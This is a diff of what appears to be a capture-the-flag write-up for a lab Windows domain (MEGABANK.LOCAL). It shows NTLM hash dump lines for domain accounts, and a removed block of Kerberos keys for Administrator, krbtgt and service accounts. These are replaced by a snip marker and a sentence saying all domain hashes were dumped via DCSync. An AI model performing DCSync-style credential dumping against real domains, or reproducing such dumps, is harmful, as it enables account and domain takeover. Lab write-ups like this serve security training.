@@ -422,42 +422,9 @@ MEGABANK.LOCAL\dgalanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e
 MEGABANK.LOCAL\roleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
 MEGABANK.LOCAL\smorgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
 MONTEVERDE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-[*] Kerberos keys grabbed
-Administrator:aes256-cts-hmac-sha1-96:e0d11994e0bc24a2814fb21392b9288d03d3b20a2ff90d2acd7885bf59f7897a
-Administrator:aes128-cts-hmac-sha1-96:5974bf7e5a66abc4a97633d2281f4051
-Administrator:des-cbc-md5:02808a2f04543d2a
-krbtgt:aes256-cts-hmac-sha1-96:0df5aaeb1e5d7bd66ceda568339d77d5f30c80954933add2fd7ed17b5e2daade
-krbtgt:aes128-cts-hmac-sha1-96:37e86168ad81735aa30dcec9106ddeed
-krbtgt:des-cbc-md5:cb311f4604ab520e
-AAD_987d7f2f57d2:aes256-cts-hmac-sha1-96:499e44309bfbd1400445d3f3a5c7214b125428a540fbe50193cdb2f273034d0c
-AAD_987d7f2f57d2:aes128-cts-hmac-sha1-96:c05c989bbc1b40295eea3c9578fa5666
-AAD_987d7f2f57d2:des-cbc-md5:3b254675bc4ccbcb
-MEGABANK.LOCAL\mhope:aes256-cts-hmac-sha1-96:f404b6355cb66799a1ffd72c49106c6cc22e16ff56c0c5e4efe713da1bca9a5e
-MEGABANK.LOCAL\mhope:aes128-cts-hmac-sha1-96:3f1c001dc2b3d4b2c827aee045b059d5
-MEGABANK.LOCAL\mhope:des-cbc-md5:1aefbcec168abaa8
-MEGABANK.LOCAL\SABatchJobs:aes256-cts-hmac-sha1-96:af25309e51c2ff3da410001334d96bd4b0ad4a393eb3f71c7412791cb5a40f11
-MEGABANK.LOCAL\SABatchJobs:aes128-cts-hmac-sha1-96:dea0c3b8b225af09bb6e656caf9f40ef
-MEGABANK.LOCAL\SABatchJobs:des-cbc-md5:a7f25702452394da
-MEGABANK.LOCAL\svc-ata:aes256-cts-hmac-sha1-96:1f4946bcd6d1949fdfab47e273255104c69ae97cb17e3d859568c8a94769dbba
-MEGABANK.LOCAL\svc-ata:aes128-cts-hmac-sha1-96:403bc14d95eaabdfc8f006edf6ba85ea
-MEGABANK.LOCAL\svc-ata:des-cbc-md5:61fe163dce984962
-MEGABANK.LOCAL\svc-bexec:aes256-cts-hmac-sha1-96:ee1b6acdef6f50bac2d086370c47b6e8ee86708b10515e2e58222e72bea7f606
-MEGABANK.LOCAL\svc-bexec:aes128-cts-hmac-sha1-96:6e92b69cc69564a94c84674a2b667e30
-MEGABANK.LOCAL\svc-bexec:des-cbc-md5:61abe0b53e103d9e
-MEGABANK.LOCAL\svc-netapp:aes256-cts-hmac-sha1-96:b61c0ff0547b9bb78721d07dfa33bc2cbb8fb9d191c8084a5a28ebaafb8e12b6
-MEGABANK.LOCAL\svc-netapp:aes128-cts-hmac-sha1-96:5bf059b408af0fc79835d99287d9b15a
-MEGABANK.LOCAL\svc-netapp:des-cbc-md5:bf51450ee3040d5e
-MEGABANK.LOCAL\dgalanos:aes256-cts-hmac-sha1-96:a460009d7fee1055297b25dd6842d496c30e2582d6fde678a07da8fc2059ba35
-MEGABANK.LOCAL\dgalanos:aes128-cts-hmac-sha1-96:08ff2b73fabe96bde46450cc2bdd3ce0
-MEGABANK.LOCAL\dgalanos:des-cbc-md5:58c2a8b925d62f67
-MEGABANK.LOCAL\roleary:aes256-cts-hmac-sha1-96:4e7d182050c52b68358512b56dc178b538b40ffe67b49180c5219524679b84d1
-MEGABANK.LOCAL\roleary:aes128-cts-hmac-sha1-96:b6d934d3853e5cd7e1d5107de46f066f
-MEGABANK.LOCAL\roleary:des-cbc-md5:468a9bf273c18c07
-MEGABANK.LOCAL\smorgan:aes256-cts-hmac-sha1-96:1ea581af68f5087bac84f7e014e1a0e6e2889824ec042908846eff38de05c371
-MEGABANK.LOCAL\smorgan:aes128-cts-hmac-sha1-96:a0442fb29e2361899c232de15f946395
-MEGABANK.LOCAL\smorgan:des-cbc-md5:156b29d0402a5e4f
-MONTEVERDE$:aes256-cts-hmac-sha1-96:98c756af0d3c1b2a9af66d87831b52dcda2ea3c52f64963b005eb8ab201b6b07
-MONTEVERDE$:aes128-cts-hmac-sha1-96:c7edabcdd8a70555a6af91f32dcbf821
-MONTEVERDE$:des-cbc-md5:01d39126b9ba61fb
-[*] Cleaning up... 
+
+
+...[SNIP]...
 ```
+
+I now have dumped all the hashes from the domain via a DCSync
